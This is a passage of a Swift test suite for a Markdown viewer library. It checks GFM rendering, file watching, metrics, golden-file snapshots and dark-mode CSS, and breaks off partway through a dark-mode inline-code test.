import Foundation
import MarkViewCore

// Simple test runner — no XCTest dependency required
struct TestRunner {
    var passed = 0
    var failed = 0
    var skipped = 0

    mutating func test(_ name: String, _ body: () throws -> Void) {
        do {
            try body()
            passed += 1
            print("  ✓ \(name)")
        } catch {
            failed += 1
            print("  ✗ \(name): \(error)")
        }
    }

    mutating func skip(_ name: String, reason: String) {
        skipped += 1
        print("  ⊘ \(name) (skipped: \(reason))")
    }

    func summary() {
        print("\nResults: \(passed) passed, \(failed) failed, \(skipped) skipped")
    }
}

func expect(_ condition: Bool, _ message: String = "Assertion failed", file: String = #file, line: Int = #line) throws {
    guard condition else {
        throw TestError.assertionFailed("\(message) (\(URL(fileURLWithPath: file).lastPathComponent):\(line))")
    }
}

enum TestError: Error, CustomStringConvertible {
    case assertionFailed(String)
    case fixtureNotFound(String)

    var description: String {
        switch self {
        case .assertionFailed(let msg): return msg
        case .fixtureNotFound(let name): return "Fixture not found: \(name)"
        }
    }
}

func loadFixture(_ name: String) throws -> String {
    guard let url = Bundle.module.url(forResource: name, withExtension: nil, subdirectory: "Fixtures") else {
        throw TestError.fixtureNotFound(name)
    }
    return try String(contentsOf: url, encoding: .utf8)
}

func normalizeHTML(_ html: String) -> String {
    html.components(separatedBy: .whitespacesAndNewlines)
        .filter { !$0.isEmpty }
        .joined(separator: " ")
}

/// Check if HTML contains an element with the given tag and content.
/// Handles sourcepos attributes: `<p data-sourcepos="1:1-1:5">text</p>` matches `hasTag("p", containing: "text")`.
func hasTag(_ tag: String, in html: String, containing text: String? = nil) -> Bool {
    // Match opening tag with optional attributes
    let pattern = "<\(tag)(\\s[^>]*)?>.*?</\(tag)>"
    guard let regex = try? NSRegularExpression(pattern: pattern, options: .dotMatchesLineSeparators) else { return false }
    let range = NSRange(html.startIndex..., in: html)
    let matches = regex.matches(in: html, range: range)
    if let text = text {
        return matches.contains { match in
            let matchRange = Range(match.range, in: html)!
            return html[matchRange].contains(text)
        }
    }
    return !matches.isEmpty
}

/// Check if HTML contains an opening tag (with optional attributes from sourcepos).
func hasOpenTag(_ tag: String, in html: String) -> Bool {
    let pattern = "<\(tag)(\\s[^>]*)?>|<\(tag)>"
    return html.range(of: pattern, options: .regularExpression) != nil
}

// =============================================================================
// MARK: - CSS Parsing Helpers (for auto-coverage tests)
// =============================================================================

/// Visual CSS properties that must be overridden in dark mode
let visualProperties: Set<String> = [
    "color", "background", "background-color", "border", "border-color",
    "border-top-color", "border-bottom-color", "border-left-color", "border-right-color"
]

struct CSSRule {
    let selector: String
    let properties: [String: String]
}

/// Simple regex-based CSS parser. Extracts selector → property pairs from a CSS block.
/// Does not handle nested @media — call on pre-split light/dark sections.
func parseCSSRules(_ css: String) -> [CSSRule] {
    var rules: [CSSRule] = []

    // Match: selector { ... }
    // Use a simple brace-counting approach for robustness
    let scanner = css as NSString
    let length = scanner.length
    var i = 0

    while i < length {
        // Skip whitespace
        while i < length && (scanner.character(at: i) == 0x20 || scanner.character(at: i) == 0x0A || scanner.character(at: i) == 0x0D || scanner.character(at: i) == 0x09) {
            i += 1
        }
        if i >= length { break }

        // Find the next '{'
        let selectorStart = i
        while i < length && scanner.character(at: i) != 0x7B /* { */ {
            i += 1
        }
        if i >= length { break }

        let selector = scanner.substring(with: NSRange(location: selectorStart, length: i - selectorStart))
            .trimmingCharacters(in: .whitespacesAndNewlines)
        i += 1 // skip '{'

        // Find matching '}'
        var braceDepth = 1
        let bodyStart = i
        while i < length && braceDepth > 0 {
            let ch = scanner.character(at: i)
            if ch == 0x7B { braceDepth += 1 }
            else if ch == 0x7D { braceDepth -= 1 }
            i += 1
        }
        let bodyEnd = i - 1
        if bodyEnd <= bodyStart || selector.isEmpty { continue }

        let body = scanner.substring(with: NSRange(location: bodyStart, length: bodyEnd - bodyStart))

        // Parse property: value pairs
        var props: [String: String] = [:]
        let declarations = body.components(separatedBy: ";")
        for decl in declarations {
            let parts = decl.split(separator: ":", maxSplits: 1)
            if parts.count == 2 {
                let prop = parts[0].trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
                let value = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)
                props[prop] = value
            }
        }

        if !props.isEmpty {
            rules.append(CSSRule(selector: selector, properties: props))
        }
    }

    return rules
}

/// Extract the CSS content between <style> and </style> from full HTML
func extractCSS(from html: String) -> String {
    guard let styleStart = html.range(of: "<style>")?.upperBound ?? html.range(of: "<style id=\"app-css\">")?.upperBound,
          let styleEnd = html.range(of: "</style>")?.lowerBound else { return "" }
    return String(html[styleStart..<styleEnd])
}

/// Split CSS into light-mode rules (before @media dark) and dark-mode rules (inside @media dark)
func splitLightDarkCSS(_ css: String) -> (light: String, dark: String) {
    guard let mediaStart = css.range(of: "@media (prefers-color-scheme: dark)") else {
        return (light: css, dark: "")
    }

    let light = String(css[css.startIndex..<mediaStart.lowerBound])

    // Find the opening brace after the media query
    let afterMedia = css[mediaStart.upperBound...]
    guard let braceStart = afterMedia.firstIndex(of: "{") else {
        return (light: light, dark: "")
    }

    // Find matching closing brace
    var depth = 1
    var idx = css.index(after: braceStart)
    while idx < css.endIndex && depth > 0 {
        if css[idx] == "{" { depth += 1 }
        else if css[idx] == "}" { depth -= 1 }
        idx = css.index(after: idx)
    }
    let braceEnd = css.index(before: idx)
    let dark = String(css[css.index(after: braceStart)..<braceEnd])

    // Also get any CSS after the dark block (it's still light-mode)
    let afterDark = String(css[idx...])
    return (light: light + afterDark, dark: dark)
}

// =============================================================================
// MARK: - Golden File Support
// =============================================================================

let fixtureNames = [
    "basic", "gfm-tables", "gfm-tasklists", "gfm-strikethrough",
    "gfm-autolinks", "code-blocks", "links-and-images", "edge-cases"
]

func goldenFilePath(for fixtureName: String) -> URL? {
    Bundle.module.url(forResource: fixtureName, withExtension: "html", subdirectory: "Fixtures/expected")
}

func generateGoldens() throws {
    // Write to the SOURCE tree, not the bundle copy
    // Locate the project root by finding Package.swift
    let cwd = FileManager.default.currentDirectoryPath
    let expectedDir = URL(fileURLWithPath: cwd)
        .appendingPathComponent("Tests/TestRunner/Fixtures/expected")
    try FileManager.default.createDirectory(at: expectedDir, withIntermediateDirectories: true)

    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let html = MarkdownRenderer.renderHTML(from: md)
        let outURL = expectedDir.appendingPathComponent("\(name).html")
        try html.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: \(name).html (\(html.count) bytes)")
    }

    // Also generate full-template versions
    let templateDir = expectedDir.appendingPathComponent("full-template")
    try FileManager.default.createDirectory(at: templateDir, withIntermediateDirectories: true)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let bodyHTML = MarkdownRenderer.renderHTML(from: md)
        let fullHTML = MarkdownRenderer.wrapInTemplate(bodyHTML)
        let outURL = templateDir.appendingPathComponent("\(name).html")
        try fullHTML.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: full-template/\(name).html (\(fullHTML.count) bytes)")
    }

    // Generate Quick Look pipeline goldens (renderHTML + postProcessForAccessibility + wrapInTemplate)
    let qlDir = expectedDir.appendingPathComponent("quick-look")
    try FileManager.default.createDirectory(at: qlDir, withIntermediateDirectories: true)
    for name in fixtureNames {
        let md = try loadFixture("\(name).md")
        let bodyHTML = MarkdownRenderer.renderHTML(from: md)
        let accessible = MarkdownRenderer.postProcessForAccessibility(bodyHTML)
        let fullHTML = MarkdownRenderer.wrapInTemplate(accessible)
        let outURL = qlDir.appendingPathComponent("\(name).html")
        try fullHTML.write(to: outURL, atomically: true, encoding: .utf8)
        print("  Generated: quick-look/\(name).html (\(fullHTML.count) bytes)")
    }

    print("\nGolden files generated. Commit these to lock in the baseline.")
}

/// Compute a line-by-line diff between two strings, returning differing lines
func computeDiff(_ expected: String, _ actual: String) -> [(line: Int, expected: String, actual: String)] {
    let expectedLines = expected.components(separatedBy: "\n")
    let actualLines = actual.components(separatedBy: "\n")
    var diffs: [(line: Int, expected: String, actual: String)] = []

    let maxLines = max(expectedLines.count, actualLines.count)
    for i in 0..<maxLines {
        let exp = i < expectedLines.count ? expectedLines[i] : "<missing>"
        let act = i < actualLines.count ? actualLines[i] : "<missing>"
        if exp != act {
            diffs.append((line: i + 1, expected: exp, actual: act))
        }
    }
    return diffs
}

// =============================================================================
// MARK: - CLI Mode Selection
// =============================================================================

if CommandLine.arguments.contains("--generate-goldens") {
    print("=== Generating Golden Files ===")
    do {
        try generateGoldens()
        print("\nDone.")
        exit(0)
    } catch {
        print("Error generating goldens: \(error)")
        exit(1)
    }
}

// =============================================================================
// MARK: - Tests
// =============================================================================

var runner = TestRunner()

// MARK: - Renderer Tests

print("\n=== Tier 1: Renderer Unit Tests ===")

runner.test("empty string renders empty") {
    let html = MarkdownRenderer.renderHTML(from: "")
    try expect(html == "", "Expected empty string, got: \(html)")
}

runner.test("paragraph renders") {
    let html = MarkdownRenderer.renderHTML(from: "Hello world")
    try expect(hasTag("p", in: html, containing: "Hello world"), "Missing paragraph tag")
}

runner.test("headers h1-h6") {
    for level in 1...6 {
        let prefix = String(repeating: "#", count: level)
        let html = MarkdownRenderer.renderHTML(from: "\(prefix) Heading \(level)")
        try expect(hasTag("h\(level)", in: html, containing: "Heading \(level)"), "Failed for h\(level)")
    }
}

runner.test("bold") {
    let html = MarkdownRenderer.renderHTML(from: "**bold text**")
    try expect(html.contains("<strong>bold text</strong>"), "Missing bold")
}

runner.test("italic") {
    let html = MarkdownRenderer.renderHTML(from: "*italic text*")
    try expect(html.contains("<em>italic text</em>"), "Missing italic")
}

runner.test("bold and italic") {
    let html = MarkdownRenderer.renderHTML(from: "***bold and italic***")
    try expect(html.contains("<strong>") && html.contains("<em>"), "Missing bold+italic")
}

runner.test("inline code") {
    let html = MarkdownRenderer.renderHTML(from: "Use `git status` to check")
    try expect(html.contains("<code>git status</code>"), "Missing inline code")
}

runner.test("blockquote") {
    let html = MarkdownRenderer.renderHTML(from: "> This is a quote")
    try expect(hasOpenTag("blockquote", in: html), "Missing blockquote")
}

runner.test("horizontal rule") {
    let html = MarkdownRenderer.renderHTML(from: "---")
    try expect(html.contains("<hr"), "Missing hr")
}

runner.test("link") {
    let html = MarkdownRenderer.renderHTML(from: "[GitHub](https://github.com)")
    try expect(html.contains("<a href=\"https://github.com\">GitHub</a>"), "Missing link")
}

runner.test("image") {
    let html = MarkdownRenderer.renderHTML(from: "![Alt text](image.png)")
    try expect(html.contains("<img src=\"image.png\" alt=\"Alt text\""), "Missing image")
}

// MARK: - GFM Extension Tests

print("\n=== Tier 1: GFM Extension Tests ===")

runner.test("GFM table") {
    let md = "| Name | Age |\n|------|-----|\n| Alice | 30 |"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Missing table")
    try expect(hasTag("th", in: html, containing: "Name"), "Missing th")
    try expect(hasTag("td", in: html, containing: "Alice"), "Missing td")
}

runner.test("GFM table alignment") {
    let md = "| Left | Center | Right |\n|:-----|:------:|------:|\n| L | C | R |"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("align=\"center\"") || html.contains("text-align: center"), "Missing center align")
    try expect(html.contains("align=\"right\"") || html.contains("text-align: right"), "Missing right align")
}

runner.test("GFM strikethrough") {
    let html = MarkdownRenderer.renderHTML(from: "~~deleted text~~")
    try expect(html.contains("<del>deleted text</del>"), "Missing strikethrough")
}

runner.test("GFM task list") {
    let md = "- [x] Done\n- [ ] Not done"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("checked"), "Missing checked attribute")
    try expect(html.contains("type=\"checkbox\""), "Missing checkbox")
}

runner.test("GFM autolink") {
    let html = MarkdownRenderer.renderHTML(from: "Visit https://example.com for info")
    try expect(html.contains("<a href=\"https://example.com\">"), "Missing autolink")
}

runner.test("fenced code block with language") {
    let md = "```python\ndef hello():\n    pass\n```"
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("pre", in: html), "Missing pre")
    try expect(html.contains("language-python"), "Missing language class")
}

// MARK: - Edge Cases

print("\n=== Tier 1: Edge Case Tests ===")

runner.test("unicode content") {
    let html = MarkdownRenderer.renderHTML(from: "Hello 世界 🌍")
    try expect(html.contains("Hello 世界 🌍"), "Unicode not preserved")
}

runner.test("nested blockquotes") {
    let md = "> Level 1\n>> Level 2\n>>> Level 3"
    let html = MarkdownRenderer.renderHTML(from: md)
    let pattern = "<blockquote(\\s[^>]*)?>|<blockquote>"
    let count = (html.range(of: pattern, options: .regularExpression) != nil) ?
        html.components(separatedBy: "blockquote").count / 2 : 0
    try expect(count >= 2, "Expected nested blockquotes, got \(count)")
}

runner.test("smart punctuation") {
    let html = MarkdownRenderer.renderHTML(from: "\"quotes\"")
    try expect(html.contains("\u{201C}") || html.contains("&ldquo;") || html.contains("\""),
               "Smart quotes not working")
}

runner.test("template wrapping") {
    let html = MarkdownRenderer.wrapInTemplate("<p>Hello</p>")
    try expect(html.contains("<!DOCTYPE html>"), "Missing doctype")
    try expect(html.contains("<p>Hello</p>"), "Missing content")
    try expect(html.contains("</html>"), "Missing closing html")
}

runner.test("custom template") {
    let template = "<html><body>\(TemplateConstants.contentPlaceholder)</body></html>"
    let html = MarkdownRenderer.wrapInTemplate("<p>Test</p>", template: template)
    try expect(html == "<html><body><p>Test</p></body></html>", "Custom template failed")
}

runner.test("TemplateConstants.contentPlaceholder used by wrapInTemplate") {
    // Verify the constant is actually what wrapInTemplate replaces
    let template = "BEFORE\(TemplateConstants.contentPlaceholder)AFTER"
    let result = MarkdownRenderer.wrapInTemplate("<p>X</p>", template: template)
    try expect(result == "BEFORE<p>X</p>AFTER", "wrapInTemplate must replace TemplateConstants.contentPlaceholder")
    try expect(!result.contains(TemplateConstants.contentPlaceholder), "Placeholder must be fully replaced")
}

// MARK: - Fixture-Based GFM Compliance

print("\n=== Tier 2: GFM Compliance (Fixture-Based) ===")

runner.test("basic.md fixture renders") {
    let md = try loadFixture("basic.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("h1", in: html), "Missing h1 in basic.md")
    try expect(html.contains("<strong>"), "Missing bold in basic.md")
    try expect(html.contains("<em>"), "Missing italic in basic.md")
    try expect(hasOpenTag("blockquote", in: html), "Missing blockquote in basic.md")
    try expect(html.contains("<hr"), "Missing hr in basic.md")
}

runner.test("gfm-tables.md fixture renders") {
    let md = try loadFixture("gfm-tables.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Missing table")
    try expect(hasOpenTag("th", in: html), "Missing th")
    try expect(hasOpenTag("td", in: html), "Missing td")
    try expect(html.contains("align="), "Missing alignment")
}

runner.test("gfm-tasklists.md fixture renders") {
    let md = try loadFixture("gfm-tasklists.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("type=\"checkbox\""), "Missing checkboxes")
    try expect(html.contains("checked"), "Missing checked items")
}

runner.test("gfm-strikethrough.md fixture renders") {
    let md = try loadFixture("gfm-strikethrough.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<del>"), "Missing strikethrough")
}

runner.test("gfm-autolinks.md fixture renders") {
    let md = try loadFixture("gfm-autolinks.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<a href="), "Missing autolinks")
}

runner.test("code-blocks.md fixture renders") {
    let md = try loadFixture("code-blocks.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("pre", in: html), "Missing code blocks")
    try expect(html.contains("language-python"), "Missing python language")
    try expect(html.contains("language-swift"), "Missing swift language")
    try expect(html.contains("language-javascript"), "Missing javascript language")
    try expect(html.contains("language-rust"), "Missing rust language")
    try expect(html.contains("language-go"), "Missing go language")
    try expect(html.contains("language-bash"), "Missing bash language")
    try expect(html.contains("language-typescript"), "Missing typescript language")
}

runner.test("links-and-images.md fixture renders") {
    let md = try loadFixture("links-and-images.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<a href="), "Missing links")
    try expect(html.contains("<img"), "Missing images")
}

runner.test("edge-cases.md fixture renders") {
    let md = try loadFixture("edge-cases.md")
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(!html.isEmpty, "Edge cases produced empty output")
    try expect(html.contains("这是一个测试段落"), "Missing Chinese unicode")
    try expect(html.contains("🚀"), "Missing emoji")
}

// MARK: - Footnote Rendering
print("\n=== Footnote Rendering Tests ===")

runner.test("footnote reference renders as superscript link") {
    let md = "Hello world[^1].\n\n[^1]: This is the footnote."
    let html = MarkdownRenderer.renderHTML(from: md)
    // cmark-gfm with CMARK_OPT_FOOTNOTES wraps references as <sup><a href="#fn...">
    try expect(html.contains("<sup>") || html.contains("fnref"),
        "Footnote reference should render as superscript or fnref anchor, got: \(html.prefix(200))")
    try expect(html.contains("fn") || html.contains("footnote"),
        "Footnote HTML should contain 'fn' or 'footnote' marker, got: \(html.prefix(200))")
}

runner.test("footnote definition renders in footnotes section") {
    let md = "Text[^note].\n\n[^note]: Footnote content here."
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("Footnote content here"),
        "Footnote definition text should appear in rendered HTML")
}

runner.test("multiple footnotes render all definitions") {
    let md = """
    First[^a] and second[^b].

    [^a]: First footnote.
    [^b]: Second footnote.
    """
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("First footnote"), "First footnote definition should appear")
    try expect(html.contains("Second footnote"), "Second footnote definition should appear")
}

runner.test("footnote-free markdown is unaffected by footnote option") {
    let md = "# Hello\n\nNo footnotes here. Just regular [links](https://example.com)."
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("<h1>") || html.contains("Hello"), "Normal heading should render")
    try expect(html.contains("href=\"https://example.com\""), "Normal link should render")
    try expect(!html.contains("<sup>"), "No superscripts without footnotes")
}

// MARK: - Performance

print("\n=== Tier 2: Performance ===")

runner.test("large file renders under 500ms") {
    let md = try loadFixture("large-file.md")
    let start = CFAbsoluteTimeGetCurrent()
    _ = MarkdownRenderer.renderHTML(from: md)
    let elapsed = (CFAbsoluteTimeGetCurrent() - start) * 1000
    print("    Render time: \(String(format: "%.1f", elapsed))ms for \(md.count) bytes")
    try expect(elapsed < 500, "Render took \(elapsed)ms, expected < 500ms")
}


// MARK: - FileWatcher Tests

print("\n=== Tier 1: FileWatcher Tests ===")

runner.test("FileWatcher detects direct write") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    let sem = DispatchSemaphore(value: 0)
    let watcher = FileWatcher(path: file.path) { sem.signal() }
    watcher.start()

    Thread.sleep(forTimeInterval: 0.2)
    try "# Modified".write(to: file, atomically: false, encoding: .utf8)

    let result = sem.wait(timeout: .now() + 3.0)
    watcher.stop()
    try expect(result == .success, "FileWatcher did not detect write within 3s")
}

runner.test("FileWatcher detects atomic save") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    let sem = DispatchSemaphore(value: 0)
    let watcher = FileWatcher(path: file.path) { sem.signal() }
    watcher.start()

    Thread.sleep(forTimeInterval: 0.2)
    let tmpFile = dir.appendingPathComponent("test.md.tmp")
    try "# Atomic save".write(to: tmpFile, atomically: false, encoding: .utf8)
    _ = try FileManager.default.replaceItemAt(file, withItemAt: tmpFile)

    let result = sem.wait(timeout: .now() + 3.0)
    watcher.stop()
    try expect(result == .success, "FileWatcher did not detect atomic save within 3s")
}

runner.test("FileWatcher stop prevents notifications") {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mvtest-\(UUID().uuidString)")
    try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: dir) }

    let file = dir.appendingPathComponent("test.md")
    try "# Original".write(to: file, atomically: true, encoding: .utf8)

    var called = false
    let watcher = FileWatcher(path: file.path) { called = true }
    watcher.start()
    watcher.stop()

    try "# Should not trigger".write(to: file, atomically: false, encoding: .utf8)
    Thread.sleep(forTimeInterval: 0.5)
    try expect(!called, "Received notification after stop")
}

// MARK: - Word Count / Stats Tests

print("\n=== Tier 1: Word Count / Stats Tests ===")

func wordCount(_ text: String) -> Int {
    text.split(whereSeparator: { $0.isWhitespace || $0.isNewline }).count
}

func lineCount(_ text: String) -> Int {
    text.isEmpty ? 0 : text.components(separatedBy: .newlines).count
}

runner.test("word count basic") {
    try expect(wordCount("Hello world") == 2, "Expected 2 words")
    try expect(wordCount("One two three four five") == 5, "Expected 5 words")
}

runner.test("word count with markdown") {
    // "# Heading\n\nA paragraph with **bold**." splits to: #, Heading, A, paragraph, with, **bold**.
    try expect(wordCount("# Heading\n\nA paragraph with **bold**.") == 6, "Expected 6 words")
}

runner.test("word count empty") {
    try expect(wordCount("") == 0, "Expected 0 words for empty string")
}

runner.test("line count") {
    try expect(lineCount("one\ntwo\nthree") == 3, "Expected 3 lines")
    try expect(lineCount("single line") == 1, "Expected 1 line")
    try expect(lineCount("") == 0, "Expected 0 lines for empty")
}

// MARK: - Renderer Stress Tests

print("\n=== Tier 2: Renderer Stress Tests ===")

runner.test("empty document renders gracefully") {
    let html = MarkdownRenderer.renderHTML(from: "")
    try expect(html.isEmpty, "Empty input should produce empty output")
}

runner.test("very long single line") {
    let longLine = String(repeating: "word ", count: 10000)
    let html = MarkdownRenderer.renderHTML(from: longLine)
    try expect(html.contains("word"), "Long line should render")
}

runner.test("deeply nested lists") {
    var md = ""
    for i in 0..<20 {
        md += String(repeating: "  ", count: i) + "- Level \(i)\n"
    }
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("ul", in: html), "Nested lists should render")
}

runner.test("many consecutive headings") {
    var md = ""
    for i in 1...100 {
        md += "## Heading \(i)\n\n"
    }
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(html.contains("Heading 1"), "First heading should render")
    try expect(html.contains("Heading 100"), "Last heading should render")
}

runner.test("mixed GFM features in one document") {
    let md = """
    # Title

    | Col A | Col B |
    |-------|-------|
    | ~~old~~ | **new** |

    - [x] Done task with `code`
    - [ ] Pending task with [link](https://example.com)

    > Blockquote with https://auto.link

    ```swift
    let x = 42
    ```
    """
    let html = MarkdownRenderer.renderHTML(from: md)
    try expect(hasOpenTag("table", in: html), "Table should render")
    try expect(html.contains("<del>"), "Strikethrough should render")
    try expect(html.contains("checkbox"), "Task list should render")
    try expect(hasOpenTag("blockquote", in: html), "Blockquote should render")
    try expect(html.contains("language-swift"), "Code block should render")
    try expect(html.contains("<a href="), "Links should render")
}

// MARK: - Metrics Tests

print("\n=== Tier 1: Metrics Tests ===")

runner.test("metrics disabled by default") {
    let metrics = MetricsCollector.shared
    // Should not crash when disabled
    metrics.trackFileOpened(sizeBytes: 1000)
    metrics.trackRender(durationMs: 5.0)
    metrics.trackExport(format: "html")
    metrics.trackFeature("editor")
    metrics.flush()
    // All good if no crash
}

runner.test("metrics aggregate loads without file") {
    let metrics = MetricsCollector.shared
    metrics.clearAll()
    let aggregate = metrics.loadAggregate()
    try expect(aggregate.totalSessions == 0, "Expected 0 sessions for fresh metrics")
    try expect(aggregate.totalFilesOpened == 0, "Expected 0 files for fresh metrics")
}

runner.test("metrics enabled tracks and persists") {
    let metrics = MetricsCollector.shared
    metrics.clearAll()
    metrics.setEnabled(true)
    metrics.trackFileOpened(sizeBytes: 5000)
    metrics.trackRender(durationMs: 3.5)
    metrics.trackRender(durationMs: 2.0)
    metrics.trackFeature("editor")
    metrics.trackFeature("export")
    metrics.trackEditorUsed()
    metrics.flush()

    let aggregate = metrics.loadAggregate()
    try expect(aggregate.totalSessions == 1, "Expected 1 session, got \(aggregate.totalSessions)")
    try expect(aggregate.totalFilesOpened == 1, "Expected 1 file opened")
    try expect(aggregate.totalRenders == 2, "Expected 2 renders")
    try expect(aggregate.largestFileEverBytes == 5000, "Expected 5000 bytes")
    try expect(aggregate.editorSessionCount == 1, "Expected 1 editor session")
    try expect(aggregate.featureUsageCounts["editor"] == 1, "Expected editor feature tracked")
    try expect(aggregate.featureUsageCounts["export"] == 1, "Expected export feature tracked")

    // Clean up
    metrics.clearAll()
    metrics.setEnabled(false)
}

// MARK: - Tier 3: Golden File Snapshot Regression Tests

print("\n=== Tier 3: Golden File Snapshot Regression ===")

do {
    // Check if golden files exist
    let firstGolden = goldenFilePath(for: "basic")
    if firstGolden != nil {
        for name in fixtureNames {
            runner.test("\(name) matches golden baseline") {
                let md = try loadFixture("\(name).md")
                let actual = MarkdownRenderer.renderHTML(from: md)
                guard let goldenURL = goldenFilePath(for: name) else {
                    throw TestError.fixtureNotFound("expected/\(name).html")
                }
                let expected = try String(contentsOf: goldenURL, encoding: .utf8)

                if normalizeHTML(actual) != normalizeHTML(expected) {
                    let diffs = computeDiff(expected, actual)
                    let diffSummary = diffs.prefix(3).map { "    L\($0.line): expected=\($0.expected.prefix(80)) actual=\($0.actual.prefix(80))" }.joined(separator: "\n")
                    throw TestError.assertionFailed("Output changed for \(name).md (\(diffs.count) lines differ):\n\(diffSummary)")
                }
            }
        }
    } else {
        print("  ⚠ No golden files found. Run with --generate-goldens to create baselines.")
    }
}

// MARK: - Tier 3: Full-Template E2E Tests

print("\n=== Tier 3: Full-Template E2E ===")

runner.test("full HTML document is well-formed") {
    let md = try loadFixture("basic.md")
    let body = MarkdownRenderer.renderHTML(from: md)
    let full = MarkdownRenderer.wrapInTemplate(body)

    try expect(full.hasPrefix("<!DOCTYPE html>") || full.contains("<!DOCTYPE html>"), "Missing DOCTYPE")
    try expect(full.contains("<html"), "Missing <html>")
    try expect(full.contains("</html>"), "Missing </html>")
    try expect(full.contains("<head>"), "Missing <head>")
    try expect(full.contains("</head>"), "Missing </head>")
    try expect(full.contains("<body>"), "Missing <body>")
    try expect(full.contains("</body>"), "Missing </body>")
    try expect(full.contains("<meta charset=\"utf-8\">"), "Missing charset meta")
    try expect(full.contains("<style>"), "Missing style block")
}

runner.test("full template contains all CSS rules") {
    let body = MarkdownRenderer.renderHTML(from: "# Test")
    let full = MarkdownRenderer.wrapInTemplate(body)

    // Key CSS features for GitHub-style rendering
    try expect(full.contains("font-family:"), "Missing font-family")
    try expect(full.contains("max-width:"), "Missing max-width")
    try expect(full.contains("prefers-color-scheme: dark"), "Missing dark mode support")
    try expect(full.contains("border-collapse"), "Missing table CSS")
    try expect(full.contains("border-radius"), "Missing code block border-radius")
    try expect(full.contains("monospace"), "Missing monospace font for code")
}

runner.test("full template renders all GFM features in context") {
    let md = """
    # Full E2E Test

    | Feature | Status |
    |---------|--------|
    | Tables | ✅ |

    - [x] Task lists
    - [ ] More tasks

    ~~struck~~ and **bold** and `code`

    > Blockquote

    ```swift
    let x = 1
    ```

    Visit https://example.com
    """
    let body = MarkdownRenderer.renderHTML(from: md)
    let full = MarkdownRenderer.wrapInTemplate(body)

    // Verify all features present in final document
    try expect(hasTag("h1", in: full, containing: "Full E2E Test"), "Missing heading")
    try expect(hasOpenTag("table", in: full), "Missing table")
    try expect(full.contains("checkbox"), "Missing task list checkboxes")
    try expect(full.contains("<del>struck</del>"), "Missing strikethrough")
    try expect(full.contains("<strong>bold</strong>"), "Missing bold")
    try expect(full.contains("<code>code</code>"), "Missing inline code")
    try expect(hasOpenTag("blockquote", in: full), "Missing blockquote")
    try expect(full.contains("language-swift"), "Missing code block language")
    try expect(full.contains("<a href=\"https://example.com\""), "Missing autolink")
}

runner.test("dark mode CSS covers all styled elements") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    // The dark mode media query must override every element that has a visible background/color in light mode
    let requiredDarkOverrides = [
        ("body", "body text/background"),
        ("th", "table header"),
        ("tr:nth-child(2n)", "alternating table rows"),
        ("blockquote", "blockquote"),
        ("hr", "horizontal rule"),
        ("h1, h2", "heading borders"),
        ("a {", "link color"),
        ("code:not(", "inline code"),
    ]

    for (selector, description) in requiredDarkOverrides {
        // Check the selector appears after the dark mode media query declaration
        guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
            throw TestError.assertionFailed("No dark mode media query found")
        }
        let afterDark = String(full[darkStart.upperBound...])
        try expect(afterDark.contains(selector),
                  "Dark mode missing override for \(description) ('\(selector)')")
    }
}

runner.test("dark mode table has proper contrast (GitHub Primer)") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query found")
    }
    let afterDark = String(full[darkStart.upperBound...])

    // Alternating rows use subtle dark background (#151b23), not same as body (#0d1117)
    try expect(afterDark.contains("#151b23"), "Dark mode alternating rows should use #151b23")

    // Borders should use GitHub dark border color #3d444d
    try expect(afterDark.contains("#3d444d"), "Dark mode borders should use #3d444d")
}

runner.test("dark mode inline code has explicit text color") {
    let full = MarkdownRenderer.wrapInTemplate("<p>test</p>")

    guard let darkStart = full.range(of: "@media (prefers-color-scheme: dark)") else {
        throw TestError.assertionFailed("No dark mode media query found")
    }
    let afterDark = String(full[darkStart.upperBound...])

    // Inline code must set both background AND color — relying on inheritance
    // can leave dark text (#1f2328) on dark background (#343942)
    guard let codeRule = afterDark.range(of: "code:not(") else {
        throw TestError.assertionFailed("Dark mode missing inline code rule")
    }
    let ruleEnd = afterDark[codeRule.upperBound...].prefix(200)
    try expect(ruleEnd.contains("color:"),
